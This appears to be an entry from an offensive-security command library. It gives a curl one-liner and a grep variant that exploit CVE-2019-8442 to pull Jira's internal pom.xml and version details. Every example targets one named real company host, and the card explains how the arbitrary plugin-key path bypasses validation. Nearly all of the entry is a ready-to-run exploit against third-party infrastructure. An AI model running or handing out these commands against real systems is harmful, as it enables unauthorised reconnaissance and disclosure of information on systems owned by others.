---
data: >-
  curl -s
  "https://sim.starbucks.com/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
tags:
  - disclosure
  - http
  - jira
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.662Z'
id: ce34b1cc-faf7-4a81-bb81-f105e938be71
verified: false
validated: true
submitted: true
---
# curl-jira-pom-disclosure

## Command

```bash
curl -s "https://sim.starbucks.com/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
```

## Description

Fetches the internal pom.xml file from JIRA Server by exploiting CVE-2019-8442 through an arbitrary plugin key path.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| `/s/thiscanbeanythingyouwant` | Arbitrary plugin key to bypass validation | Yes |
| `pom.xml` path | Specific internal file target | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://sim.starbucks.com/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
```

### Advanced Usage

```bash
curl -s "https://sim.starbucks.com/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml" | grep '<version'
```

## Expected Output

XML content starting with <?xml version="1.0"?>, including <artifactId>atlassian-jira-webapp</artifactId> and dependencies.

## Related

- [[commands/curl-jira-user-enumeration]]
- [[procedures/Exploit-JIRA-CVE-2019-8442-POM-Disclosure]]
